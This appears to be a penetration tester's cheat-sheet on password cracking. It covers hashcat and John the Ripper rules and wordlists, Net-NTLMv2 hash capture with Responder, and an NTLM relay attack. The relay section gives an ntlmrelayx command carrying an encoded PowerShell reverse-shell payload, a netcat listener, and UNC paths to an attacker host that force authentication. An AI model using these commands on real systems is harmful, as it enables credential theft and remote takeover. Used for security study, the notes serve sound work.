# Password cracking



???+ tip
    For web applications, always consider as users both "admin" and otherwise also "user" if no clue.

???+ tip
    **hashcat** > Retry without -O since that is discarding longer passwords

???+ tip
    Try rockyou with **rules**, not only **best64** and **rockyou-30000** but also **d3ad0ne**.rule, T0XlC.rule, T0XlCv2.rule...

-  Great wordlists: [weakpass](#https://weakpass.com/), [packetstorm](#https://packetstormsecurity.com/Crackers/wordlists/)
-  Great rules: [pantagrule](#https://github.com/rarecoil/pantagrule), [OneRuleToRuleThemAll](#https://notsosecure.com/one-rule-to-rule-them-all/)

## Bruteforce

```bash
# bruteforces any password from 4 to 8 characters long
hashcat --attack-mode 3 --increment --increment-min 4 --increment-max
8 --hash-type $number $hashes_file "?a?a?a?a?a?a?a?a?a?a?a?a"

# Hashcat has the following built-in charsets that can be used.
?l = abcdefghijklmnopqrstuvwxyz
?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
?d = 0123456789
?s = !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
?a = ?l?u?d?s
?b = 0x00 - 0xff

```


## kwprocessor

It's common for users to create passwords based on keyboard sequences such as qwertyuiop or qazxsw. A wordlist with such passwords can be generated using kwprocessor.


```bash
https://github.com/hashcat/kwprocessor
git clone ...
make
./kwp basechars/full.base keymaps/en-us.keymap routes/2-to-16-max-3-direction-changes.route > mykwplist.txt
```

    If password is 8+ length you have to pay, it is a professional service to crack hashes, good for enterprise audits.

## Rules / Wordlists

???+ tip
    `rockyou-30000.rule` is a very good rule to use along with rockyou.txt


### John1

```bash

# To be able to use the previously created rules in JtR, we need to adda name for the rules and append them to the /etc/john/john.conf configuration file.
cat ssh.rule

c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#

sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'

john --wordlist=ssh.passwords --rules=sshRules ssh.hash

# We use a regex style pattern match to define where in the word will be modified, again- we will only cover the basic and most common modifiers here:
# Az - Takes the word and appends it with the characters you define
# A0 - Takes the word and prepends it with the characters you define
# c - Capitalises the character positionally

# Capitalise the first  letter - c
# Append to the end of the word - Az
# A number in the range 0-9 - [0-9]
# Followed by a symbol that is one of [!£$%@]

cAz"[0-9] [!£$%@]"
# Another example --> all capital laters to the end of the word
Az"[A-Z]"

john --wordlist=[path to wordlist] --rule=PoloPassword [path to file]

## Password Hashes

We can only extract passwords if we are running Mimikatz as Administrator (or higher) and have the _SeDebugPrivilege_ access right enabled.

## Cracking Net-NTLMv2

If we've obtained code execution on a remote system, we can easily force it to authenticate with us by commanding it to connect to our prepared SMB server. For example, we can simply run **ls \\\LOCAL\_IP\SHARE** in PowerShell (assuming our Responder is listening on that IP). If we don't have code execution, we can also use other vectors to force an authentication. For example, when we discover a **file upload/URL form in a web application** on a Windows server, we can try to enter a non-existing file with a **UNC path** like '\LHOST\SHARE\nonexistent.txt or \\\\\\\LHOST\\\SHARE\\\nonexistent.txt'. If the web application supports uploads via SMB, the Windows server will authenticate to our SMB server.

```bash
sudo responder -I $interface
# To catch a Net-NTLMv2 hash
dir \\192.168.119.2\test
\\192.168.119.2\share
```

## Relaying Net-NTLMv2

In case we have access to a user that is unprivileged on one host but may exist and be privileged on another host. We could relay the authentication from one host to another.

???+ tip
    the target system needs to have UAC remote restrictions disabled or the command execution will fail. If UAC remote restrictions are enabled on the target then we can only use the local _Administrator_ user for the relay attack.


```bash
# setting up an SMB server and relaying the authentication part of an incoming SMB connection to a target (after -enc comes base64-PS-revshell-one-liner)
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.50 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
# now we prepare to catch our revshell on the desired port
rlwrap nc -lvnp 443
# And from the already got shell or from a file upload / other method that allows us to specify UNC path, we trigger the SMB authentication to our attacking machine
dir \\$ATTACKER_IP\test
\\\\$ATTACKER_IP\\test
# We should see an incoming connection on (relay-attack)  to execute the reverse shell on the target host
```


## PDF

```bash

```

## MD5 Collision

[https://github.com/thereal1024/python-md5-collision](https://github.com/thereal1024/python-md5-collision)

## Cracking time


```bash
Cracking time = keyspace / hash rate
keyspace = number of different caracters the password can have (X) power number of password's chars (Y)  = XY

# Using all latin alphabet plus digits as chars of the password, for a 5-char length password
echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c
python3 -c "print(62**5)"
# result determines how many unique variations can be generated for a five-character password with this character set

Hash rate is hash calculations / second. To find it, use Hashcat's benchmark mode for a specific hash algorithm
Differentiate CPU benchmark and GPU benchmark (second applies when there is a GPU attached to hashcat)
1 MH/s equals 1,000,000 hashes per second
```
